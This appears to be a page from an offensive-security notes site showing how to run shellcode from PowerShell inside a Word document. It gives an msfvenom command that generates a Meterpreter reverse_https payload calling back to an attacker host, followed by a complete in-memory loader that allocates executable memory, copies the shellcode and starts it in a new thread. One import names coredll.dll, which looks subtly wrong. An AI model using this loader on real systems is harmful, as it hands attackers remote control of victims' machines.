---
title: PowerShell Shellcode in Word
layout: default
parent: Client Side Execution
---

Similar to CSharp, the theory is to:
1. Allocate memory with `VirtualAlloc(0, sizeOfShellcodeArray, 0x3000, 0x40)`
2. Copy shellcode using `[System.Runtime.InteropServices.Marshal]::Copy(shellcodeBuffer, 0, startAddress, $size)`. startAddress here is the return value of `VirtualAlloc()` in step 1.
3. Execute with `CreateThread(0, 0, startAddress, 0, 0, 0)`, and assign the value to `$thandle`
4. Don't exit the newly created thread even though our PowerShell is closed using `WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")`

First, generate the shellcode using msfvenom:

```
msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=PORT EXITFUNC=thread -f ps1
```

Then put it into the Powershell code below:

```powershell
$Shell32 = @"
using System;
using System.Runtime.InteropServices;

public class Shell32{
[DllImport("Kernel32.dll")][return: MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 1)]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

[DllImport("Kernel32.dll")][return: MarshalAs(UnmanagedType.SysInt)]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("coredll.dll", SetLastError = true)]
public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
}
"@

Add-Type $Shell32

[Byte[]] $buf = SHELLCODE HERE
$size = $buf.length
[IntPtr]$addr = [Shell32]::VirtualAlloc(0,$size,0x3000,0x40);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)
$thandle=[Shell32]::CreateThread(0,0,$addr,0,0,0);
[Shell32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```
